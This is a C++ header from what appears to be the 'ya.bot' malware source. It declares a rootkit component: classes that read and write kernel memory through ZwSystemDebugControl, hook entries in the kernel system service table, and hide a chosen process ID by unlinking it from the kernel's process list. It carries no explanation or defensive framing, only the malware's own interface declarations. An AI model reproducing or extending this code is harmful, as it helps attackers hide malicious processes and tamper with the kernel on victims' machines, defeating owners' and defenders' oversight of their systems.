/*  ya.bot  */

#ifndef NO_RING0
#pragma once

extern "C" 
{ 
	WINBASEAPI DWORD NTAPI ZwUnmapViewOfSection(IN HANDLE ProcessHandle, IN PVOID BaseAddress);
	WINBASEAPI LONG NTAPI NtQuerySystemInformation(DWORD SysInfClass,
			PVOID SysInf,
			ULONG SysInfLength,
			PULONG ReturnLength);
	WINBASEAPI LONG NTAPI ZwSystemDebugControl(DWORD ControlCode,
			PVOID InputBuffer,
			ULONG InputBufferLength,
			PVOID OutputBuffer,
			ULONG OutputBufferLength,
			PULONG ReturnLength);
}

class KernelMemory
{
	public:
		DWORD ReadMemWord(DWORD addr);
		void WriteMemWord(DWORD addr, DWORD data);
		void ReadMem(DWORD addr, PVOID data, DWORD size);
		void WriteMem(DWORD addr, PVOID data, DWORD size);
		KernelMemory();
};

class KernelHook
{
	private:
		DWORD entryPointer;
		DWORD orgValue;
		DWORD newValue;
		KernelMemory* km;
	public:
		void enable();
		void disable();
		KernelHook(DWORD entryPointer, DWORD orgValue, DWORD newValue);
		~KernelHook();
};

class KernelHooks
{
		PDWORD orgFuncs;
		DWORD table;
		KernelMemory *km;
		void getKernelInfo(DWORD* baseAddress, CHAR name[256]);
		DWORD findServiceTable(HMODULE module, DWORD sdt);
	public:
		KernelHook getKernelHook(const char *functionName);
		KernelHooks();
		~KernelHooks();
};

class HideProcess
{
	private:
		KernelMemory* km;
		DWORD systemProcess;
		DWORD flinkOffset;
		DWORD pidOffset;
		void GetKernelInfo(DWORD *baseAddress, CHAR name[256]);
	public:
		void hidePID(DWORD pid);
		HideProcess(void);
		~HideProcess(void);
};
#endif